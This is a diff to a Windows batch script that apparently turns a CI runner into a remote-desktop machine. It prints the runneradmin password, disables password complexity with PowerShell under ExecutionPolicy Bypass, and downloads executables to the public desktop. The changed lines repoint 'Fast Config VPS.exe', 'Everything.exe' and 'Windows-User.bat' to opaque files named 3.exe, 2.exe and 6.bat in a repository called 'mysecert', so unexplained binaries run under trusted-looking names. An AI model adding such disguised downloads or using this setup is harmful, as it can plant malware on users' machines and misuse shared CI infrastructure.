@@ -48,9 +48,9 @@ sh ip.sh
 echo User: runneradmin
 echo Pass: %_Password%
 curl -O https://raw.githubusercontent.com/CZ4B/RDP/main/Files/DisablePasswordComplexity.ps1 > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\Fast Config VPS.exe" https://raw.githubusercontent.com/alexdanca/3h4hdoet924gwoedb395heb4boDi3hfn/main/Files/FastConfigVPS_v5.1.exe > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\Everything.exe" https://raw.githubusercontent.com/alexdanca/3h4hdoet924gwoedb395heb4boDi3hfn/main/Files/Everything.exe > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\Windows-User.bat" https://raw.githubusercontent.com/alexdanca/3h4hdoet924gwoedb395heb4boDi3hfn/main/Files/Windows-User.bat > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\Fast Config VPS.exe" https://raw.githubusercontent.com/Supercoder610002/mysecert/main/Files/3.exe > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\Everything.exe" https://raw.githubusercontent.com/Supercoder610002/mysecert/main/Files/2.exe > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\Windows-User.bat" https://raw.githubusercontent.com/Supercoder610002/mysecert/main/Files/6.bat > out.txt 2>&1
 
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& './DisablePasswordComplexity.ps1'" > out.txt 2>&1
 diskperf -Y >nul
